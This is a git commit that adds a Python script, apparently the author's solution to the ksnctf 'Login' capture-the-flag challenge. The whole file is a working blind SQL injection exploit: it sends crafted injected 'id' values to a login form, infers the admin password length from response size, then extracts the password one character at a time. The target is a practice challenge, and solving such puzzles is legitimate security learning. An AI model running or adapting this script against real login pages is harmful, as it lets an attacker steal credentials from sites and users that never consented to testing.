aef4d3bb7db426376e63fbd70e2712d2fd3cd6ba
gky360 <gky360@gmail.com>
2018-05-16 17:08:01 +0900

    [ksnctf] 6. Login

---
+++ knsctf/src/q006/q006.py
@@ -0,0 +1,36 @@
+import requests
+
+url = 'http://ctfq.sweetduet.info:10080/~q6/'
+
+pass_len = 0
+for i in range(1, 100):
+    sql = 'admin\' AND (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') = {counter} --'.format(
+        counter=i)
+    payload = {
+        'id': sql,
+        'pass': '',
+    }
+    response = requests.post(url, data=payload)
+    if len(response.text) > 2000:
+        pass_len = i
+        print('length of the password is {counter}'.format(counter=pass_len))
+        break
+
+password = ''
+for index in range(1, pass_len + 1):
+    for char_number in range(48, 123):
+        char = chr(char_number)
+        sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{char}\' --'.format(
+            index=index, char=char)
+        payload = {
+            'id': sql,
+            'pass': ''
+        }
+        response = requests.post(url, data=payload)
+        if len(response.text) > 2000:
+            print(char, end="")
+            password += char
+            break
+
+print()
+print(password)
